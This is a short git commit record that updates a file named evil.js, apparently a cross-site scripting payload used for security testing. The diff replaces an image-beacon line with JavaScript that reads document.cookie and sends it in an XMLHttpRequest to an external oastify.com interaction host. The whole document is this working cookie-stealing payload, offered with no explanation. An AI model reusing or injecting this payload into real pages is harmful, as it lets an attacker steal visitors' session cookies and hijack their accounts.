a0105707acbd0c91a42f91b319ef1ae2f7755a57
Mukarram Khalid <mukarramkhalid@gmail.com>
2022-10-27 00:02:44 +0800

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,1 +1,3 @@
-document.write('<img src="http://y436lpjr4zkl6577bxbgoxfal1rtfi.oastify.com">');
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'http://y436lpjr4zkl6577bxbgoxfal1rtfi.oastify.com/?' + document.cookie, true);
+xhttp.send();
